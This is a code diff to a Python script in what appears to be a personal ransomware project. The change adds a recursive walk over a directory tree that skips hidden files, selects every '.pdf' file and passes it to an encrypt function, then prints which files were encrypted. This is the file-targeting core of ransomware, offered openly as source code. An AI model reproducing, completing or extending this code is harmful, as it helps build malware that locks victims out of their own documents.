@@ -3,16 +3,25 @@ from os.path import isdir,isfile,splitext
 from os import listdir
 
 import encrypt
-import decrypt
+
+encr=['.pdf']
 
 def movein(dirpath='/home/ashwin/Documents/projects/Ransomware'):
     for each in listdir(dirpath):
-        if each.isdir():
-            movein(each)
-        elif each.isfile():
-            extenstion=splitext(each)
+        if each[0]=='.':
+            continue
+        fpath=dirpath+'/'+each
+        # print(fpath)
+        if isdir(fpath):
+            # print('isDir')
+            movein(fpath)
+        elif isfile(fpath):
+            # print('isFile')
+            extension=splitext(fpath)[1]
+            # print(extension)
             if extension in encr:
-                encrypt()
-
-if __name__ == '__main__':
-    movein()
+                # print(fpath)
+                encrypt.encrypt(fpath)
+                print('encrypted %s'%each)
+        else:
+            print('Cant tell type')
